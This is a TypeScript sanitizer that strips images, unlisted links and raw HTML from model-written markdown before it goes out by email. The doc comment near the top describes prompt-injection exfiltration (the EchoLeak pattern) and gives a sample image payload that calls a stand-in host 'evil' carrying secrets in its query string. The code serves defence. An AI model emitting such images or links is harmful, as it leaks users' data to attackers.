import { Marked } from "marked";

/**
 * Outbound text built by a model from untrusted inputs is an exfiltration channel: a prompt-injected
 * brief could render `![](https://evil/?q=<secrets>)` or a link that leaks data when clicked
 * (the EchoLeak pattern). Before anything leaves Worklog we:
 *  - drop images entirely,
 *  - keep a link only if its exact URL appeared in the data the text was written from (or is ours),
 *  - escape raw HTML.
 */
export function sanitizeMarkdown(
  markdown: string,
  allowedUrls: Iterable<string>,
  publicUrl?: string
): string {
  const allowed = new Set([...allowedUrls].filter(Boolean));
  const ok = (url: string) =>
    allowed.has(url) || (publicUrl ? url.startsWith(publicUrl) : false);
  return (
    markdown
      // ![alt](url) and ![alt][ref] → nothing
      .replaceAll(/!\[[^\]]*\]\([^)]*\)/gu, "")
      .replaceAll(/!\[[^\]]*\]\[[^\]]*\]/gu, "")
      // reference-style definitions: [ref]: url
      .replaceAll(/^\s*\[[^\]]+\]:\s*\S+.*$/gmu, "")
      // [text](url "title") → keep or unwrap
      .replaceAll(
        /\[(?<text>[^\]]*)\]\(\s*<?(?<url>[^)\s>]+)>?(?:\s+"[^"]*")?\s*\)/gu,
        (_, text: string, url: string) => (ok(url) ? `[${text}](${url})` : text)
      )
      // <https://autolinks>
      .replaceAll(/<(?<url>https?:\/\/[^>\s]+)>/gu, (_, url: string) =>
        ok(url) ? `<${url}>` : "(link removed)"
      )
      // bare URLs not already inside a markdown link
      .replaceAll(
        /(?<pre>^|[^(<\w])(?<url>https?:\/\/[^\s)>\]]+)/gu,
        (m, pre: string, url: string) => (ok(url) ? m : `${pre}(link removed)`)
      )
  );
}

/** Collects every URL-looking string in a data structure (the provenance allowlist). */
export function urlsIn(data: unknown): string[] {
  const out: string[] = [];
  const walk = (v: unknown) => {
    if (typeof v === "string") {
      for (const m of v.matchAll(/https?:\/\/[^\s)>\]"]+/gu)) {
        out.push(m[0]);
      }
    } else if (Array.isArray(v)) {
      for (const item of v) {
        walk(item);
      }
    } else if (typeof v === "object" && v !== null) {
      for (const item of Object.values(v)) {
        walk(item);
      }
    }
  };
  walk(data);
  return out;
}

const escapeHtml = (s: string) =>
  s
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;");

const emailMarkdown = new Marked({
  renderer: {
    html: ({ text }) => escapeHtml(text),
    image: ({ text }) => escapeHtml(text),
  },
});

export async function toEmailHtml(markdown: string): Promise<string> {
  return await emailMarkdown.parse(markdown);
}
